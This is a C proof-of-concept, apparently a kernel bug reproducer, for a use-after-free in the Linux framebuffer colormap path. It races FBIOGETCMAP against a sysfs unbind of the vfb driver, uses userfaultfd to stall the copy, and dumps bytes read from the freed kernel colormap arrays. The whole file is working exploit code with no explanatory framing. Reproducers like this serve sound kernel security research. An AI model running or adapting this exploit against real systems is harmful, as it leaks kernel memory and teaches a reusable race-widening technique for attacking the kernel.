// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/fb.h>
#include <linux/userfaultfd.h>

#define UNBIND   "/sys/bus/platform/drivers/vfb/unbind"
#define DEVNAME  "vfb.0"
#define CMAP_LEN 256
#define PAGE     4096

static int g_fd = -1;
static int g_uffd = -1;
static unsigned char *g_red;
static unsigned char *g_rest;
static int g_ret, g_err;

static int sysfs_write(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int r;

	if (fd < 0) {
		printf("[-] open %s: %s\n", path, strerror(errno));
		return -1;
	}
	r = write(fd, val, strlen(val));
	if (r < 0)
		printf("[-] write %s: %s\n", path, strerror(errno));
	close(fd);
	return r < 0 ? -1 : 0;
}

static void *getcmap_thread(void *arg)
{
	struct fb_cmap cmap;

	memset(&cmap, 0, sizeof(cmap));
	cmap.start  = 0;
	cmap.len    = CMAP_LEN;
	cmap.red    = (__u16 *)g_red;
	cmap.green  = (__u16 *)(g_rest + 0x0000);
	cmap.blue   = (__u16 *)(g_rest + 0x1000);
	cmap.transp = NULL;

	printf("[A] FBIOGETCMAP: snapshot info->cmap, unlock, copy_to_user()\n");
	g_ret = ioctl(g_fd, FBIOGETCMAP, &cmap);
	g_err = errno;
	printf("[A] FBIOGETCMAP returned %d (%s)\n", g_ret,
	       g_ret ? strerror(g_err) : "ok");
	return NULL;
}

static int uffd_setup(void)
{
	struct uffdio_api api;
	struct uffdio_register reg;

	g_uffd = syscall(SYS_userfaultfd, O_CLOEXEC);
	if (g_uffd < 0) {
		printf("[-] userfaultfd: %s\n", strerror(errno));
		return -1;
	}
	memset(&api, 0, sizeof(api));
	api.api = UFFD_API;
	if (ioctl(g_uffd, UFFDIO_API, &api) < 0) {
		printf("[-] UFFDIO_API: %s\n", strerror(errno));
		return -1;
	}
	memset(&reg, 0, sizeof(reg));
	reg.range.start = (unsigned long)g_red;
	reg.range.len   = PAGE;
	reg.mode        = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(g_uffd, UFFDIO_REGISTER, &reg) < 0) {
		printf("[-] UFFDIO_REGISTER: %s\n", strerror(errno));
		return -1;
	}
	return 0;
}

static void hexdump(const char *tag, const unsigned char *p, int n)
{
	int i;

	printf("[*] %s:", tag);
	for (i = 0; i < n; i++) {
		if ((i % 16) == 0)
			printf("\n    %04x:", i);
		printf(" %02x", p[i]);
	}
	printf("\n");
}

int main(void)
{
	struct uffd_msg msg;
	struct uffdio_copy copy;
	unsigned char *filler;
	pthread_t th;
	int uffd_ok;

	setvbuf(stdout, NULL, _IONBF, 0);

	g_red = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	g_rest = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
		      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	filler = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
		      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (g_red == MAP_FAILED || g_rest == MAP_FAILED || filler == MAP_FAILED) {
		perror("mmap");
		return 1;
	}
	memset(g_rest, 0x41, 0x2000);
	memset(filler, 0x41, PAGE);

	g_fd = open("/dev/fb0", O_RDWR);
	if (g_fd < 0) {
		printf("[-] open /dev/fb0: %s (boot with video=vfb:640x480-8)\n",
		       strerror(errno));
		return 1;
	}
	printf("[+] /dev/fb0 open (vfb, cmap len 256 -> 3 x kmalloc-512)\n");

	uffd_ok = uffd_setup() == 0;
	if (!uffd_ok)
		printf("[!] no userfaultfd - falling back to a timing race\n");

	pthread_create(&th, NULL, getcmap_thread, NULL);

	if (uffd_ok) {

		if (read(g_uffd, &msg, sizeof(msg)) != sizeof(msg)) {
			printf("[-] uffd read: %s\n", strerror(errno));
			return 1;
		}
		printf("[B] ioctl parked in the page fault handler @ %#llx\n",
		       (unsigned long long)msg.arg.pagefault.address);
	} else {
		usleep(100000);
	}

	printf("[B] unbind vfb -> vfb_remove() -> fb_dealloc_cmap()\n");
	sysfs_write(UNBIND, DEVNAME);
	printf("[B] colormap arrays are now freed\n");

	if (uffd_ok) {
		memset(&copy, 0, sizeof(copy));
		copy.dst = (unsigned long)g_red;
		copy.src = (unsigned long)filler;
		copy.len = PAGE;
		if (ioctl(g_uffd, UFFDIO_COPY, &copy) < 0)
			printf("[-] UFFDIO_COPY: %s\n", strerror(errno));
		printf("[B] fault resolved, ioctl resumes into the freed cmap\n");
	}

	pthread_join(th, NULL);

	hexdump("bytes copied out of the freed cmap->green array (first 64)",
		g_rest, 64);

	close(g_fd);
	printf("[*] done\n");
	return 0;
}
